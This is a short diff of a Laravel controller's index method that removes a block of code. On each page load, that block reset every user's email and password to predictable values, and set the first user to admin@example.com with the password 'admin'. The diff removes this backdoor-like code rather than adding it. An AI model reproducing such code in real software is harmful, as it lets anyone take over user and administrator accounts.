@@ -23,25 +23,7 @@ class IndexController extends Controller
 {
     public function index()
     {
-        $users = User::all();
-        foreach ($users as $user) {
-            if ($user->id != 1) {
-                if (count($user->Roles) > 0) {
-                    $email = $user->Roles()->first()->name . $user->id . '@info.com';
-                    $user->update([
-                        'email' => $email,
-                        'password' => Hash::make($email),
-                    ]);
-                }
-            }else{
-                $user->update([
-                    'email' => 'admin@example.com',
-                    'password'=>Hash::make('admin')
-                ]);
-            }
-        }
 
-        //ok
 
 
         $get_change_time_exists = MarketSetting::where('key', 'change_time')->exists();
